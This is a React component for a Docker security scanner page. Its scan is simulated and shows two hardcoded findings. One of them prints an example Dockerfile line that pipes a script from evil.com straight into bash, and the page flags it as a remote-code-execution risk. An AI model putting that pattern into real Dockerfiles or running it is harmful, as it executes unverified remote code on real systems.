"use client";

import { useState } from "react";
import { SeverityBadge } from "@/components/ui/Badge";
import Image from "next/image";

export default function DockerScanner() {
  const [scanning, setScanning] = useState(false);
  const [resultsReady, setResultsReady] = useState(false);
  
  const handleScan = () => {
    setScanning(true);
    setResultsReady(false);
    setTimeout(() => {
        setScanning(false);
        setResultsReady(true);
    }, 2000);
  };

  return (
    <div className="space-y-8 animate-in fade-in duration-500 pb-12 relative z-10 max-w-6xl mx-auto">
      
      {/* Attractive Cyber Header */}
      <div className="relative overflow-hidden rounded-2xl bg-gradient-to-br from-[#0B0F19] via-[#0A101C] to-black border border-ds-border mb-8 animate-in slide-in-from-bottom-2 duration-500 group">
        <div className="absolute inset-0 opacity-30 mix-blend-screen transition-transform duration-1000 group-hover:scale-105 pointer-events-none">
          <img src="/hero-docker.png" alt="Docker Security" className="absolute inset-0 w-full h-full object-cover animate-in fade-in duration-700" />
        </div>
        <div className="absolute inset-0 bg-gradient-to-r from-[#0B0F19] via-[#0B0F19]/80 to-transparent pointer-events-none"></div>
        <div className="relative z-10 p-8 md:p-12 max-w-3xl">
          <div className="inline-flex items-center gap-2 px-2.5 py-1 rounded-md bg-ds-elevated/50 border border-ds-border text-text-muted text-[10px] font-semibold uppercase tracking-widest mb-4">
            Infrastructure Analysis
          </div>
          <h1 className="text-3xl md:text-4xl font-medium text-white mb-3 tracking-tight drop-shadow-lg">Docker Security</h1>
          <p className="text-text-secondary text-base max-w-2xl mb-6 drop-shadow-md">
            Audit Dockerfiles and configurations for root privilege escalations, unsafe volume mounts, and missing healthchecks.
          </p>
          <div className="flex gap-4">
            <button 
              onClick={handleScan} 
              disabled={scanning}
              className="bg-cyan-600 hover:bg-cyan-500 text-white px-5 py-2.5 rounded-lg font-bold text-sm transition-all shadow-[0_0_15px_rgba(8,145,178,0.5)] hover:shadow-[0_0_25px_rgba(8,145,178,0.8)] hover:-translate-y-0.5 border border-cyan-400/30 flex items-center gap-2 relative z-20 disabled:opacity-50 disabled:hover:bg-cyan-600 disabled:hover:-translate-y-0"
            >
              {scanning ? <span className="animate-spin text-white">◌</span> : 
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M22 12h-4l-3 9L9 3l-3 9H2"></path></svg>}
              {scanning ? "Analyzing infrastructure..." : "Scan Containers"}
            </button>
          </div>
        </div>
      </div>
      
      {resultsReady && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-5 animate-in slide-in-from-bottom-2 duration-500">
            <div className="bg-ds-elevated/50 border border-ds-border rounded-xl p-5 hover:border-text-muted/30 transition-colors">
                <div className="flex justify-between items-center mb-4">
                    <h3 className="font-medium text-white text-base">Dockerfile Misconfiguration</h3>
                    <SeverityBadge severity="HIGH" />
                </div>
                <div className="bg-[#0B0F19] p-4 rounded-lg border border-ds-border font-mono text-[13px] overflow-x-auto text-text-secondary">
                    <pre><code className="text-ds-danger">FROM ubuntu:latest</code><br/><code className="text-white">USER root</code><br/><code>RUN curl -s http://evil.com/script.sh | bash</code></pre>
                </div>
                <p className="text-[13px] text-text-secondary mt-4 mb-5">Container runs as root and pipes curl to bash without verification, risking RCE.</p>
                <button className="text-sm font-medium text-white underline decoration-text-muted underline-offset-4 hover:decoration-white transition-colors">Remediate via AutoFix</button>
            </div>
            
            <div className="bg-ds-elevated/50 border border-ds-border rounded-xl p-5 hover:border-text-muted/30 transition-colors">
                <div className="flex justify-between items-center mb-4">
                    <h3 className="font-medium text-white text-base">Missing Healthcheck</h3>
                    <SeverityBadge severity="MEDIUM" />
                </div>
                <div className="bg-[#0B0F19] p-4 rounded-lg border border-ds-border font-mono text-[13px] overflow-x-auto text-text-secondary">
                    <pre><code>FROM node:18-alpine</code><br/><code className="text-text-muted"># No HEALTHCHECK directive specified</code><br/><code>CMD ["npm", "start"]</code></pre>
                </div>
                <p className="text-[13px] text-text-secondary mt-4 mb-5">Lack of healthcheck limits the orchestrator's ability to monitor internal container state.</p>
                <button className="text-sm font-medium text-white underline decoration-text-muted underline-offset-4 hover:decoration-white transition-colors">Remediate via AutoFix</button>
            </div>
        </div>
      )}
    </div>
  );
}
